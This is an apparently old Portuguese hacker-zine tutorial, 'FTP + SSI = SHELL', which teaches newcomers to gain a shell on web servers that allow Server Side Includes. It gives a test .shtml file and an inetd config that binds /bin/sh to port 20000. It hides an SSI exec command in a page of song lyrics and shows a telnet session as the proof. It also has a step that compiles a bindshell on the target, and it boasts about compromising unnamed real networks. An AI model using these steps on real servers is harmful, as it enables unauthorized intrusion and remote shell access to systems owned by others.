@@ -1,0 +1,226 @@
+
+                              Unsekurity Scene
+                        
+
+Desenvolvido por Martin Fallon.
+mar_fallon@yahoo.com.br
+
+Estes e outros artigos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+
+OBS: Elites, Pseudo-Elites e Analistas de Seguranca, nao percam o tempo
+     precioso de voces lendo este simples artigo! Este artigo eh voltado
+     a toda comunidade NewBie,em especial a Comunidade Unsekurity Scene!
+
+
+                          ***********************
+                          *  FTP + SSI = SHELL  *
+                          ***********************
+
+1 - Introducao
+2 - Configuracoes Bugadas
+3 - Exploitando o Sistema
+4 - Consideracoes Finais
+
+
+1 - Introducao
+---------------
+
+Existem dezenas, talvez ateh centenas de textos descrevendo os problemas
+existentes na mah configuracao de servidores WEB permitindo execucao e
+uso de SSI.O motivo d'eu estar escrevendo mais um texto falando sobre como
+obter acesso shell em servidores com SSI eh que a maioria dos textos sao
+vagos em aspectos hacking! Nao demonstram com clareza aonde esta tecnica
+eh aplicada e nem quais os reais perigos de se estar vulneravel a ela!
+
+Olhando pelo lado do hacking etico, realmente eu ainda nao vih um texto
+que falasse com clareza, como se exploitar um sistema e como tirar vantagem
+em cima desta tecnica! Nao quero com essas linhas menosprezar algum
+escritor, afinal, eu nao lih todos os possiveis textos e alguns textos que
+abordam este assunto sao bastante bons para o pessoal da seguranca(only
+security).
+
+Server Site Include, vulgarmente conhecido como SSI, eh um recurso usado
+em websites para criar dados dinamicos em paginas .html! Atravez de uma
+"meta-tag", eh possivel se passar parametros atuais e dinamicos como
+respostas as requisicoes dos navegadores.O formato de um Server Site
+Include segue descrito abaixo:
+
+<!--#elemento atributo="parametros para o atributo" -->
+
+Existem varios "elementos", mas para nos(fucadores) a que mais interessa
+eh a "exec"(em alguns casos a echo tb - veja o manual do apache para
+maiores detalhes sobre os atributos de SSI).O elemento exec eh responsavel 
+por executar comandos shell na maquina alvo! Muitos jah devem estar vendo a 
+trivialidade da tecnica! Mas, vamos com calma.
+
+2 - Configuracoes Bugadas
+--------------------------
+
+Varios e varios sistemas e servidores web podem estar vulneraveis a
+implementacao desta tecnica! Procurando facilitar a vida dos "webmasters",
+muitos administradores de rede se esquecem dos problemas existentes em se
+habilitar a execucao de parametros SSI.
+
+Para que o ataque possa ser bem implementado, algumas informacoes nos
+devem ser fornecidas:
+
+* Uma conta de FTP no sistema alvo com direito a "atualizacao" de home
+  pages;
+
+* Servidor WEB permitindo o uso de SSI.Voce pode saber se ele estah
+  executando ou nao, das seguintes maneiras:
+ 
+  + Captura do arquivo httpd.conf do apache ou de configuracao dos outros
+    Web Servers.No apache, devemos procurar(mais ou menos) pelas seguintes
+    linhas descomentadas:
+
+  <Directory />
+    Options FollowSymLinks Includes
+    AllowOverride None
+  </Directory>
+
+   #O que nos importa eh este "Includes"
+
+  <Directory "/usr/local/apache/htdocs">
+    Options Indexes FollowSymLinks MultiViews Includes
+  </Directory>
+
+  Se voce achou esses "Includes" descomentados nas linhas, entao existe
+  uma chance muito forte do servidor alvo estar permitindo a passagem de
+  instrucoes SSI.E se vc achar a linha abaixo descomentada, maior chance
+  ainda:
+
+  AddHandler server-parsed .shtml
+
+  + Teste SSI no sistema.Se voce nao tem acesso ao httpd.conf, ou nao sabe
+    aonde o senhor "root" instalou o apache, voce pode testar se o sistema
+    permite o uso de SSI atraves de um simples .shtml teste:
+
+  <html>
+  <body>
+  Seu Diretorio Atual Tem:<BR>
+  <!--#exec cmd="/bin/ls"-->
+  </body>
+  </html>
+
+   Depois voce envia um "get" via navegador para a pagina escrita, e se
+   aparecer os arquivos do seu diretorio FTP, entao comemore! Voce tem
+   acesso a comandos da shell! Um passo para controlar todo o sistema!
+
+ 
+Se voce checou e viu que o sistema estah bugado, entao o proximo passo eh
+exploitar o uso de SSI para obter vantagens.
+
+3 - Exploitando o Sistema
+--------------------------
+
+Temos acesso FTP, o sistema tah permitindo o uso de SSI.O sistema nao
+eh linux! Eh um mainframe de grande porte rodando sabe-se lah qual unix!
+Mas eu sei que eh Unix! E se eh unix, eu posso fazer "coisas" com ele!
+
+Nao imaginando uma situacao trivial na qual bastaria enviar uma bindshell
+compilada estaticamente em nossa maquina local para o host alvo e depois
+executar esta bindshell via SSI, vamos mais alem! Se o sistema nao for
+um dos que voce tem, voce precisarah improvisar!! Entao, fucemos!
+
+* Inetd
+
+Criamos um arquivo de configuracao para chamarmos o inetd com o seguinte
+conteudo:
+
+20000    stream  tcp     nowait  root    /bin/sh  sh
+
+Enviamos o arquivo para o servidor alvo.Depois enviamos o arquivo .shtml
+responsavel pela execucao do SSI:
+
+------------------------- taxi_lunar.shtml ----------------------------
+
+<html>
+<title>Martin Fallon largado pela amada!</title>
+<body>
+"Ela me deu o seu amor.. eu tomei..<br>
+ no dia 16 de maio, viajei..<br>
+ Espaconave atropelado, procurei..<br>
+ O meu amor aperriado!!<br>
+<p></p>
+ Apenas apanhei na Beira-Mar<br>
+ um taxi pra estacao lunar!<br>
+<p></p>
+ Bela linda criatura, bonita<br>
+ Nem menina, nem mulher<br>
+ Tem o espelho do seu rosto, de neve<br>
+ Nem menina, nem mulher<br>
+<p></p>
+ Apenas apanhei na Beira-Mar<br>
+ um taxi pra estacao lunar!<br>
+<p></p>
+Pela sua cabeleira, vermelha<br>
+pelos raios desse sol, lilaz<br>
+pelo fogo do seu corpo, incendeia<br>
+belos raios desso sol<br>
+<p></p>
+Apenas apanhei na Beira-Mar<br>
+um taxi pra estacao lunar!"<br>
+<p></p>
+<p></p>
+                        (Taxi Lunar - Zeh Ramalho)
+
+<!--#exec cmd="/usr/sbin/inetd ~vitima/public_html/meuinetd.conf"-->
+</body>
+</html>
+
+------------------------------------------------------------------------
+
+Aih eh apenas mandar brasa! Get no navegador para a pagina alvo e depois:
+
+# telnet localhost 20000
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+id;
+uid=99(nobody) gid=98(nobody) groups=98(nobody)
+: command not found
+exit;
+Connection closed by foreign host.
+
+Podemos ir mais alem, lembre-se que eh o usuario "nobody" que estarah
+executando o SSI, logo, em varias redes, ele nao eh chrootado!:)(Respondi o 
+desafio!!)..Que o diga a rede da XXXXXX e da YYYYYYYYYYYY e tambem da 
+ZZZZZZZZ, ops, outra alih tb!! Serao todas?!?!?!?!:).
+
+chroot e seus conceitos defasados!
+
+* Bindshell
+
+Envia-se um codigo de uma bindshell para o host alvo e manda ele compilar
+por lah:
+
+<!--#exec cmd="cc -o bindshell bindshell.c"
+
+Lembre-se de setar o diretorio +rw para que o nobody possa criar arquivos
+nele!
+
+4 - Consideracoes Finais
+-------------------------
+
+Server Site Includes tambem pode ser usado para invadir sistemas sem
+a necessidade de uma conta de FTP no alvo! Existem formulario, bookmarks,
+forums e etc que permitem o envio de parametros html e SSI tb!:), mas
+isso fica para outro tutorial!
+
+SSI, PHP, Procmail, existem varios outros esquemas para se obter acesso
+shell em um host alvo atraves de uma conta valida de FTP! Aos poucos eu
+irei disponibilizando maiores esquemas! A musica eh soh para definir meu
+estado de espirito! Daqui a dez anos, espero olhar para este artigo numa
+situacao completamente diferente! Ou mesmo numa quimera sem fim!
+
+Links:
+
+http://unsekurity.virtualave.net/
+http://www.bufferoverflow.org/
+http://www.absoluta.org/ -> Tem artigo sobre CGI e SSI.
+
+Um [].
+Fallon.
+
